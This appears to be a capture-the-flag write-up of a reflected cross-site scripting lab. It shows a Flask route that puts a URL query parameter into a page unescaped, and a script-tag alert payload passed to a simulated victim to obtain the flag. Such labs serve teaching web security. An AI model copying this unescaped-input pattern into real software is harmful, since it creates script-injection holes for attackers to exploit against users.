# Cross Site Scripting 3

In this challenge, we have `/challenge/server` that will server us a blog post web app. There is a `/challenge/victim`
that will act as the victim.

The first 2 challenges used a **stored XSS attack**, which used the web server's database to store malicious javascript or HTML.

We will now look at a **Reflected XSS attack**, which usually means that an attacker will trick the victim into visiting
a specially crafted URL with the right parameters. There is no database in this case to store our payload.

Let's look at the server, which is now much simpler:

```python
@app.route("/", methods=["GET"])
def challenge_get():
    return f"""
        <html><body>
        <h1>pwnmsg ephemeral message service</h1>
        The message:
        {flask.request.args.get("msg", "(none)")}
        <hr>
        <form>
            Craft a message:
            <input type=text name=msg>
            <input type=submit value="Make URL!">
        </form>
        </body></html>
    """
```

This takes the query parameter right from the URL and then puts it on the victim's web browser directly.

Let's see what it takes this time for the victim to spit out the flag:

```python
challenge_url = sys.argv[1]
browser.get(challenge_url)

try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(open("/flag").read().strip())
```

Looks like the requirement to obtain the flag is the same. But this time, we pass into the `/challenge/victim` the URL
we want them to visit.

So, our payload can be something like this:

```bash
/challenge/victim 'http://challenge.localhost:80/?msg=<script>alert("PWNED")</script>'
```

And there you go! This gets the victim to get spooked and spit out the flag!